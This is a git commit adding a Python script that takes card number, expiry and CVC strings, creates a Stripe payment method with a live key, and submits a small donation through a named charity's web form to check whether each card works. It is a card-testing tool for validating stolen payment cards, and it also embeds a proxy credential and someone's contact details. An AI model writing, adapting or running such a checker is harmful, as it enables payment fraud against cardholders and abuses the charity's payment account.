e3e075aac847ee7addbc532334bb079a208da9a2
bhokbantawa <bhokbantawa@gmail.com>
2026-08-19 22:31:18 +0545

    Add files via upload

---
+++ gatet0.py
@@ -0,0 +1,129 @@
+import random
+import string
+import requests
+from user_agent import generate_user_agent
+#from proxy import reqproxy, make_request
+import json
+import re
+
+#============================================
+def generate_full_name():
+    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa", "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha", "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada", "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar", "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia", "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem", "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia", "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
+    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White", "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera", "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza", "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard", "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell", "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
+    return random.choice(first_names), random.choice(last_names)
+
+def generate_address():
+    cities = ["London", "Birmingham", "Manchester", "Liverpool", "Leeds", "Glasgow", "Sheffield", "Edinburgh", "Bristol", "Cardiff"]
+    states = ["England", "England", "England", "England", "England", "Scotland", "England", "Scotland", "England", "Wales"]
+    streets = ["Baker St", "Oxford St", "High St", "King's Rd", "Abbey Rd", "The Strand", "Regent St", "Whitehall", "Fleet St", "Pall Mall"]
+    zip_codes = ["SW1A 1AA", "W1D 3QF", "M1 1AE", "N1C 4AG", "EC1A 1BB", "SE1 8XX", "B1 1AA", "RG1 8DN", "SW1E 5RS", "B2 5DT"]
+    
+    city = random.choice(cities)
+    street_address = f"{random.randint(1, 999)} {random.choice(streets)}"
+    zip_code = random.choice(zip_codes)
+    return street_address, city, "GB", zip_code, f"07{random.randint(100000000, 999999999)}"
+
+def generate_email():
+    return f"user{random.randint(10000,99999)}@example.com"
+
+def generate_username():
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
+
+def generate_random_code(length=32):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
+
+#============================================
+def Tele(ccx):
+    #proxy_str = "brd.superproxy.io:33335:brd-customer-hl_5c664e64-zone-datacenter_proxy1:0bnfn02i83lj"
+    #session, ip = reqproxy(proxy_str)
+    #print(f"IP Address: {ip}")
+    ccx=ccx.strip()
+    n = ccx.split("|")[0]
+    mm = ccx.split("|")[1]
+    yy = ccx.split("|")[2]
+    cvc = ccx.split("|")[3]
+    if "20" in yy:#Mo3gza
+        yy = yy.split("20")[1]
+    elif "01" in mm or "02" in mm or "01" in mm or "03" in mm or "04" in mm or "05" in mm or "06" in mm or "07" in mm or "08" in mm or "09" in mm:
+        mm = mm.split("0")[1]
+
+    user = generate_user_agent()
+    r = requests.Session()
+    r.verify = False
+    
+    first_name, last_name = generate_full_name()
+    kaddress, city, country, postcode, phone =     generate_address()
+    kaddress, city, country, postcode, phone = generate_address()
+    email = generate_email()
+    username = generate_username()
+    corr = generate_random_code()
+    sess = generate_random_code()
+    nr = random.randint(100000, 999999)
+    lr = random.randint(1000, 9999)
+    
+    headers = {
+        'authority': 'api.stripe.com',
+    'accept': 'application/json',
+    'accept-language': 'en-US,en;q=0.9',
+    'content-type': 'application/x-www-form-urlencoded',
+    'origin': 'https://js.stripe.com',
+    'referer': 'https://js.stripe.com/',
+    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-site',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+    }
+    
+    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51Ssb1PQKv7Pa5TYrRye5jCnNuoF5AKML2OSyaYolYmYzuIyMCGr7ZcWxiBDI1fpYHvNDpYoxy2J7I2SpdTuwLMZa00IGG1aaXB'
+    
+    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+    
+    pm = response.json()['id']
+    
+    cookies = {
+        '__stripe_mid': '784e53e1-4cea-478b-bb9b-bc343c02d04438b2cd',
+    '__stripe_sid': '798a287b-b69e-427a-8a5d-57fb4dbe2aae1d2b79',
+    }
+    
+    headers = {
+        'authority': 'saphausa.org',
+    'accept': '*/*',
+    'accept-language': 'en-US,en;q=0.9',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    # 'cookie': '__stripe_mid=784e53e1-4cea-478b-bb9b-bc343c02d04438b2cd; __stripe_sid=798a287b-b69e-427a-8a5d-57fb4dbe2aae1d2b79',
+    'origin': 'https://saphausa.org',
+    'referer': 'https://saphausa.org/donation/',
+    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+    'x-requested-with': 'XMLHttpRequest',
+    }
+    
+    params = {
+        't': '1787157518110',
+    }
+    
+    data = {
+        'data': f'__fluent_form_embded_post_id=5442&_fluentform_1_fluentformnonce=b076d42cb9&_wp_http_referer=%2Fdonation%2F&names%5Bfirst_name%5D=Yangtaru&names%5Blast_name%5D=Ira&email=yangtaru686%40gmail.com&phone=%2B12028057096&input_text=13th%20Street%20Avenue&input_radio=Zakat&payment_input=Custom%20Amout&custom-payment-amount=0.50&message=&payment_method=stripe&__stripe_payment_method_id={pm}',
+        'action': 'fluentform_submit',
+        'form_id': '1',
+    }
+    
+    response = requests.post(
+        'https://saphausa.org/wp-admin/admin-ajax.php',
+        params=params,
+        cookies=cookies,
+        headers=headers,
+        data=data,
+    )
+    return response.text
+    
+#test_card = "4001421623736484|03|29|855"
+#print(Tele(test_card))
